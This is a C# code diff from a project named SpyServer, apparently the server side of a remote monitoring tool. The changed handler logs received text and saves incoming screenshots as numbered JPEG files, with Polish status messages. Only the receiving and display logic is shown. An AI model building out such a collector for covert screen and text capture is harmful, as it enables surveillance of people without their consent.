@@ -80,31 +80,29 @@ namespace SpyServer
                 {
                     mainWindow.TextBlock.Dispatcher.Invoke(() =>
                     {
-                        mainWindow.TextBlock.Text = obj.ToString();
+                        mainWindow.TextBlock.Text += "Otrzymano tekst   ====>\n";
                     });
-                    
+                    mainWindow.TextBlock2.Dispatcher.Invoke(() =>
+                    {
+                        mainWindow.TextBlock2.Text += obj.ToString() + "\n";
+                    });
+
                 }
                 if(obj is Image)
                 {
                     mainWindow.TextBlock.Dispatcher.Invoke(() =>
                     {
-                        mainWindow.TextBlock.Text = obj.GetType().Name;
+                        mainWindow.TextBlock.Text += "Otrzymano zrzut ekranu\n";
                     });
                     
                     Bitmap bmp = (Bitmap)obj;
                     Bitmap bmp2 = new Bitmap(bmp);
-                    bmp2.Save("image" + ++lastImage + ".jpeg", ImageFormat.Jpeg);
-
-                    //GC.KeepAlive()
-                    mainWindow.ScreenShotImage.Dispatcher.Invoke(() =>
+                    string name = "image" + ++lastImage + ".jpeg";
+                    bmp2.Save(name, ImageFormat.Jpeg);
+                    
+                    mainWindow.TextBlock2.Dispatcher.Invoke(() =>
                     {
-                        BitmapImage bitmap = new BitmapImage();
-                        bitmap.BeginInit();
-                        bitmap.UriSource = new Uri("image" + lastImage + ".jpeg", UriKind.Relative);
-                        bitmap.EndInit();
-                        mainWindow.ScreenShotImage.Source = bitmap;
-                        //mainWindow.ScreenShotImage.Source = new BitmapImage(new Uri();// "Screenshots/image.png";
-                        //bmp.Save("screenshot.bmp");
+                        mainWindow.TextBlock2.Text += "Zrzut ekranu zapisany jako: " + name + "\n";
                     });
                     
                 }
